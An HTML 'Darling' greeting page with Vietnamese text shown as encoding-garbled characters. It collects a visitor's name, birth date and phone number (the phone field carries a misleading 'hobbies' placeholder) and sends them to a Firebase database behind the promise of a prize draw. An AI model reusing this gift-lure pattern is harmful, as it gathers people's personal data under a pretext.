<!DOCTYPE html>  
<html lang="vi">  
<head><!-- Firebase App (Core SDK) -->
<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js"></script>
<!-- Firebase Analytics (n·∫øu b·∫°n d√πng) -->
<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-analytics.js"></script>
<!-- Firebase Database -->
<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js"></script>

<script>
  const firebaseConfig = {
    apiKey: "AIzaSyChEj1SNl3sfMuo9unE8F3TfC7fOKlIXeo",
    authDomain: "kitanh.firebaseapp.com",
    databaseURL: "https://kitanh-default-rtdb.firebaseio.com",
    projectId: "kitanh",
    storageBucket: "kitanh.firebasestorage.app",
    messagingSenderId: "698622023279",
    appId: "1:698622023279:web:a35c71a4db2e4cb7561f9a",
    measurementId: "G-X7H2P63C28"
  };

  // Kh·ªüi t·∫°o Firebase
  const app = firebase.initializeApp(firebaseConfig);
  const analytics = firebase.analytics();
  const database = firebase.database();
</script>
  
<meta charset="UTF-8" />  
<meta name="viewport" content="width=device-width, initial-scale=1.0" />  
<title>Darling</title>  
<style>  
  body {  
    background-image: url('https://image.dienthoaivui.com.vn/x,webp,q90/https://dashboard.dienthoaivui.com.vn/uploads/dashboard/editor_upload/hinh-nen-hoa-tulip-1.jpg');  
    background-size: cover;  
    background-position: center;  
    background-repeat: no-repeat;  
    height: 100vh;  
    margin: 0;  

    display: flex;  
    justify-content: center;  
    align-items: center;  
    flex-direction: column;  
  }  

  /* ƒê·ªãnh d·∫°ng chung cho n·ªôi dung ch√≠nh */  
  .content {  
    background-color: rgba(0, 0, 0, 0.3);  
    padding: 20px;  
    border-radius: 10px;  
    text-align: center;  
  }  

  /* Ch·ªØ m√†u h·ªìng cho t·∫•t c·∫£ th·∫ª ph√π h·ª£p */  
  h1, p, .name-label {  
    color: pink;  
    font-family: Arial, sans-serif;  
  }  

  /* Style ri√™ng cho h√¨nh GIF */  
  .gif-img {  
    display: block;  
    margin: 20px auto; /* n·∫±m gi·ªØa */  
    width: 300px; /* k√≠ch th∆∞·ªõc to h∆°n */  
    max-width: 80%;  
    height: auto;  
    border-radius: 5px;  
  }  

  /* Style cho input */  
  input[type="text"] {  
    padding: 10px;  
    font-size: 1em;  
    border-radius: 5px;  
    border: 2px solid #ccc;  
    outline: none;  
  }  

  input[type="text"]:focus {  
    border-color: pink;  
    box-shadow: 0 0 8px pink;  
  }  

  /* Style n√∫t x√°c nh·∫≠n */  
  #confirmBtn {  
    margin-top: 10px;  
    padding: 10px 20px;  
    font-size: 1em;  
    border-radius: 5px;  
    border: none;  
    background-color: pink;  
    cursor: pointer;  
  }  
</style>  
</head> <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
 
<body>  

<!-- H√¨nh ·∫£nh nh·ªè ·ªü g√≥c tr√°i -->  
<img src="gif/cutee.gif" alt="cute" style="  
  position: fixed;  
  top: 10px;  
  left: 10px;  
  width: 200px;  
  height: auto;  
  z-index: 9999;  
  border-radius: 5px;  
"/>
<!-- H√¨nh ·∫£nh nh·ªè ·ªü g√≥c ph·∫£i -->     
<img src="gif/cutee.gif" alt="cute" style="  
  position: fixed;  
  top: 10px;  
  right: 10px;  
  width: 200px;  
  height: auto;  
  z-index: 9999;  
  border-radius: 5px;  
"/>

<!-- N·ªôi dung ch√≠nh -->  
<div class="content">  
  <h1>T·ªõ Ch√†o ƒê·∫±ng ·∫§y Nh√© M·ª´ng L√† C·∫≠u ƒê√£ Gh√© ThƒÉm</h1>  
  <!-- H√¨nh GIF l·ªõn, n·∫±m gi·ªØa -->  
  <img src="gif/cute.gif" alt="" class="gif-img" />  
  <p style="font-size: 2em;">Tr∆∞·ªõc Ti√™n Th√¨ Cho T·ªõ L√†m Quen C·∫≠u C√°i ƒê√£ Nh√©</p>  
  <div class="name-label" style="font-size: 1.5em;">Cho B·ªïn Cung Xin C√°i T√™n C·ªßa Nh√† Ng∆∞∆°i ?</div>  
  <input type="text" id="username" placeholder="Nh·∫≠p t√™n c·ªßa b·∫°n" />
  <!-- N√∫t x√°c nh·∫≠n -->  
  <button id="confirmBtn">X√°c nh·∫≠n</button>  
</div>  
<!-- N·ªôi dung trang m·ªõi -->
<div id="newContent" style="display:none; padding:20px; text-align:center;">
  <h2 style="color: pink;">Vui l√≤ng ƒëi·ªÅn c√°c th√¥ng tin sau:</h2>
  <!-- Ng√†y sinh -->
  <div style="margin-top:10px;">
    <label for="dob" style="display:block; color:pink;">Ng√†y Th√°ng NƒÉm Sinh C·ªßa C·∫≠u:</label>
    <input type="date" id="dob" style="width:100%; padding:10px; border-radius:5px; border:2px solid #ccc;" />
  </div>
  
  <!-- S·ªü th√≠ch -->
  <div style="margin-top:10px;">
    <label for="sothich" style="display:block; color:pink;">T·ªõ C√≥ Th·ªÉ Li√™n L·∫°c V·ªõi C·∫≠u Qua S·ªë Phone Khum:</label>
    <input type="text" id="sothich" placeholder="Ghi s·ªü th√≠ch c·ªßa b·∫°n" style="width:100%; padding:10px; border-radius:5px; border:2px solid #ccc;" />
  </div>
  
  <!-- C√¢u h·ªèi c√≥ mu·ªën nh·∫≠n qu√† -->
  <div style="margin-top:10px;">
    <label for="quatang" style="display:block; color:pink;">B√™n M√¨nh C√≥ M·ªôt Ph·∫ßn Qu√† Nho Nh·ªè Mu·ªën G·ª≠i ƒê·∫øn B·∫°n, B·∫°n C√≥ ƒê·ªìng √ù Kh√¥ng ·∫†?</label>
    <input type="text" id="quatang" placeholder="Tr·∫£ l·ªùi..." style="width:100%; padding:10px; border-radius:5px; border:2px solid #ccc;" />
  </div>
  <button id="confirmNext">X√°c nh·∫≠n</button> 
</div>
<!-- N·ªôi dung trang m·ªõi -->  
<div id="secondepage" style="display:none; padding:20px; text-align:center;">  
  <h2  style="color: pink;">Ch√∫c M·ª´ng C·∫≠u ƒê√£ ƒê·∫øn ƒê∆∞·ª£c ƒê√¢y NH√©!</h3>  
  <p style="color: pink;">ƒê·ª£i Ch·ªù C√°i R√¨ N·ªØa B·∫•m N√∫t V√† Nh·∫≠n L·∫•y Ph·∫ßn Th∆∞·ªüng ƒêiiiii !!</p>
  <div id="spinContainer" style="display:none; margin-top:20px; text-align:center;">
  <p style="color: pink; font-size: 1.5em;">üéÅ K·∫øt qu·∫£ b·ªëc thƒÉm:</p>
  <div id="result" style="color: yellow; font-size: 2em; margin-top: 10px;"></div>
  <button id="spinBtn" style="margin-top:20px; padding:10px 20px; border:none; background:pink; border-radius:5px; cursor:pointer;">
    B·ªëc thƒÉm
  </button>
</div>  
</div>  
<script>
  const mainContent = document.querySelector('.content');
  const newContent = document.getElementById('newContent');
  const secondPage = document.getElementById('secondepage');
  const spinContainer = document.getElementById('spinContainer');

  // N√∫t 1: qua b∆∞·ªõc nh·∫≠p th√™m th√¥ng tin
  document.querySelector('#confirmBtn').addEventListener('click', function () {
    mainContent.style.display = 'none';
    newContent.style.display = 'block';
  });

  // N√∫t 2: x√°c nh·∫≠n th√¥ng tin + l∆∞u v√†o localStorage
  document.getElementById('confirmNext').addEventListener('click', function () {
    const name = document.getElementById('username').value;
    const dob = document.getElementById('dob').value;
    const phone = document.getElementById('sothich').value;
    const consent = document.getElementById('quatang').value;

    // T·∫°o object ch·ª©a d·ªØ li·ªáu ng∆∞·ªùi d√πng
    const userData = {
      name: name,
      dob: dob,
      phone: phone,
      consent: consent
    };

    // L∆∞u v√†o localStorage
    localStorage.setItem('userInfo', JSON.stringify(userData));
    // L∆∞u v√†o Firebase Realtime Database
firebase.database().ref('users').push(userData);


    // Chuy·ªÉn sang ph·∫ßn b·ªëc thƒÉm
    newContent.style.display = 'none';
    secondPage.style.display = 'block';
    spinContainer.style.display = 'block';
  });

  // N√∫t b·ªëc thƒÉm
  const prizes = [
    "M·ªôt l·ªùi ch√∫c d·ªÖ th∆∞∆°ng üéâ",
    "M·ªôt m√≥n qu√† b·∫•t ng·ªù üéÅ",
  ];

  const resultDiv = document.getElementById('result');
  const spinBtn = document.getElementById('spinBtn');

  spinBtn.addEventListener('click', function () {
    const randomIndex = Math.floor(Math.random() * prizes.length);
    const prize = prizes[randomIndex];
    resultDiv.textContent = prize;

    spinBtn.disabled = true;
    spinBtn.textContent = "ƒê√£ b·ªëc thƒÉm üéâ";
    spinBtn.style.backgroundColor = "#ccc";
    spinBtn.style.cursor = "not-allowed";

    confetti({
      particleCount: 150,
      spread: 100,
      origin: { y: 0.6 }
    });

    // ‚úÖ In d·ªØ li·ªáu v·ª´a l∆∞u trong console ƒë·ªÉ ki·ªÉm tra
    const savedData = JSON.parse(localStorage.getItem('userInfo'));
    console.log("D·ªØ li·ªáu ƒë√£ l∆∞u:", savedData);
  });
</script>


